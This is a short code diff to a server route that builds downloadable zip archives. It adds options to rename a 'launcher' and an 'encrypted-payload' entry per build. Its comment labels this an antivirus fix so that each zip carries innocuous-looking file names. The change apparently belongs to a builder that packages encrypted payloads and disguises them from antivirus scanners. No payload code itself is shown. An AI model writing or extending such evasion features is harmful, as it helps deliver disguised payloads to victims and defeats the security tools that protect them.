@@ -493,6 +493,12 @@ async function postBuildZip(request: FastifyRequest, reply: FastifyReply) {
           // served zip download filename (fallback "Agent.zip").
           zipName:
             typeof flags.zipName === "string" ? flags.zipName.trim() : "",
+          // FIX 3 (AV): renameable launcher + encrypted-payload entry names so
+          // every zip can carry innocuous, per-build file names.
+          launcherName:
+            typeof flags.launcherName === "string" ? flags.launcherName.trim() : "",
+          payloadName:
+            typeof flags.payloadName === "string" ? flags.payloadName.trim() : "",
         },
       });
       if (!fs.existsSync(storage.zipOutputPath(jobId))) {
